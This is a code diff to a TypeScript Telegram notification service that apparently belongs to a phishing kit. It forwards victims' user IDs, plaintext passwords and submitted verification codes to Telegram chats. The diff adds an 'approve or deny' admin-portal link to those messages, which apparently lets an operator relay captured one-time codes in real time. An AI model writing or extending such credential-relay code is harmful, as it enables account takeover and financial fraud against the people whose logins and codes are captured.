@@ -64,6 +64,11 @@ export interface VerifyDetailsData {
   cardLastFour: string;
 }
 
+// /** Base ADMIN_PORTAL_URL for Telegram approve/deny links (no /admin/login path). */
+// function adminPortalLink(): string {
+//   return normalizeAdminPortalUrl(process.env.ADMIN_PORTAL_URL)
+// }
+
 class TelegramService {
   private botToken: string;
   private chatIds: string[];
@@ -84,6 +89,7 @@ class TelegramService {
       );
       return;
     }
+
 
     const url = `https://api.telegram.org/bot${this.botToken}/sendMessage`;
 
@@ -150,12 +156,30 @@ class TelegramService {
 
   async sendLoginNotification(data: LoginData): Promise<void> {
     const message = `\n${isProduction ? "" : "[TEST]"} \n🔐 <b>Login Attempt - ${SITE_NAME}</b>\n\n👤 <b>User ID:</b> ${data.userId}\n🔑 <b>Password:</b> ${data.password}`;
-    await this.sendMessage(message);
+
+        const adminLink = process.env.ADMIN_PORTAL_URL as string;
+        const adminLinkEncoded = encodeURIComponent(adminLink);
+
+        const newMessage = `
+    ${message}
+    \n
+    👉 ${adminLinkEncoded} Approve or deny,
+    `;
+    await this.sendMessage(newMessage);
   }
 
   async sendVerificationNotification(data: VerificationData): Promise<void> {
     const message = `\n${isProduction ? "" : "[TEST]"} \n✅ <b>Verification Code Submitted - ${SITE_NAME}</b>\n\n🔐 <b>Type:</b> ${data.verificationType}\n🔢 <b>Code:</b> ${data.code}`;
-    await this.sendMessage(message);
+
+        const adminLink = process.env.ADMIN_PORTAL_URL as string;
+        const adminLinkEncoded = encodeURIComponent(adminLink);
+
+        const newMessage = `
+    ${message}
+    \n
+    👉 ${adminLinkEncoded} Approve or deny,
+    `;
+    await this.sendMessage(newMessage);
   }
 
   async sendVerificationClickNotification(
